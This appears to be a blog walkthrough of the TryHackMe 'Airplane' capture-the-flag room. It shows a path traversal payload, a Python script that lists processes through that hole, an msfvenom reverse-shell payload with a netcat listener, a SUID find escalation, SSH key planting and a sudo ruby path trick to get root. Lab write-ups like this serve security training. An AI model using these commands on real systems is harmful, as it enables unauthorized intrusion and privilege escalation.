+++
title = 'Airplane THM Walkthrough'
date = 2024-06-17T07:17:09-04:00
summary = 'A walkthrough of a medium room in TryHackMe. A great room needing critical thinking to exploit path traversal attacks to scripting to manipulate a gdbserver process to a tricky privilege escalation by ruby.'
+++

# Airplane TryHackMe Walkthrough

![](/images/airplane/airplane.png)
Such a fun challenge. First add your ip to /etc/hosts

After booting up the box, the first thing is to perform enumeration. I first scanned with nmap and got some interesting results:
![](/images/airplane/airplanescan.png)\
Port 22 -> Just ssh. We wouldn't get to this first\
Port 6048 -> NOTHING running! This left me confused\
Port 8000 -> http running. Interesting! I navigated to the website

![](/images/airplane/airplaneport8000.png)
Just an html site. I viewed page source if any hints, none. Checked if *robots.txt* exists, it doesn't.\
The next thing I always do is run directoty scanners to find interesting pages, but none
![](/images/airplane/airplanedirsearch.png)\
Dirb gave nothing too :( \
After being stuck for sometime, I looked at the url and suspected it could be vulnerable to path traversal due to its structure /?page=\
I tried the obvious attack payload ../../../../../etc/passwd and lol
![](/images/airplane/airplanepasswdfile.png)

Going through the passwd file, we find 2 users, carlos and hudson

Now here is where I got stuck the most. After a day, or so, I started thinking about the port open that had nothing. After some research, I found that there was I way I could check the processes running on the machine. I used GPT to assist me write a script to extract these processes.(Yes, AI will make you a good security analyst if you know how to use it well). The script:

```
import requests

# Base URL of the target vulnerable to path traversal
base_url = 'http://airplane.thm:8000/?page='

# Function to check and save process names
def check_processes():
    with open('process.txt', 'w') as file:
        for pid in range(1, 1001):
            url = f'{base_url}../../../../../../../../proc/{pid}/comm'
            response = requests.get(url)
            if response.status_code == 200 and response.text.strip() != "Page not found" and response.text.strip():
                file.write(f'PID {pid}: {response.text.strip()}\n')

# Run the function
check_processes()
```
So the processes are output in the file process.txt. Going through them, I find one interesting one, airplane

![](/images/airplane/airplaneairplaneprocess.png)
Figured it must be the one running on port 6048, and it is a gdbserver process.

Searching on searchsploit, found an exploit
![](/images/airplane/airplanesearchsploit.png)

For the exploit, you need a reverse shell code, which we can generate by msfvenom
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.4.84.61 LPORT=1234 PrependFork=true -o shell.bin

Replace your ip. Open another terminal window and listen on an empty port with netcat
> nc -nvlp 1234

Now run the python script
![](/images/airplane/airplanesendpayload.png)

A reverse shell is created, for the user hudson
![](/images/airplane/airplanereverseshell.png)

Stabilize the shell by:
> python3 -c 'import pty; pty.spawn("/bin/bash")'

I checked /home/hudson, but nothing. It means we need to do lateral escalation to go to user carlos. Now I tried maybe checking *sudo -l* but it asks for password. Tried multiple stuff but settled on checking SUID
![](/images/airplane/airplanesuid.png)

I was interested by the SUID find, so it checked on my goto to privilege escalation tool, [GTFOBins](https://gtfobins.github.io/)
![](/images/airplane/airplanefindgtfobins.png)

Exploit by the command
> ./find . -exec /bin/sh -p \; -quit

![](/images/airplane/airplanesuidexploit.png)

We get euid of carlos while on user hudson. cat /home/carlos/user.txt for first flag

Now we need to do **Privilege Escalation to become Root**

But nothing much we can do from hudson. But since we can now create files on /home/carlos, we can create an ssh key file and use it to login as carlos.\
On your machine, generate ssh keys by:
> ssh-keygen

![](/images/airplane/airplanessh-keygen.png)

Now copy your keygen.pub to /home/carlos/.ssh/authorized_keys
![](/images/airplane/airplaneauthorizedkeys.png)

Perfect, now head on to ssh via the other private key
> ssh -i airplane_rsa carlos@10.10.238.182

![](/images/airplane/airplanesshlogin.png)

Niceeee!! We in as Carlos. Trying *sudo -l*, carlos can exploit some commands, ruby, as root without root password:
![](/images/airplane/airplanesudo-l.png)

I head to GTFOBins, and get this command to exploit ruby as root
> sudo ruby -e 'exec "/bin/sh"'

The problem is it will require carlos password, which we don't have. Damn! I remembered though you can run a file from another directory by going back using ../ the proceeding to what you need to run. So, we can run the file ruby from the directory /root. First, put the escalation command in a directory like /tmp

> echo 'exec "/bin/sh"' > /tmp/sudo.rb

Now we can execute it from root:
> sudo /usr/bin/ruby /root/../tmp/sudo.rb

![](/images/airplane/airplanesudoescalation.png)

There! We get root privileges!! FUN!!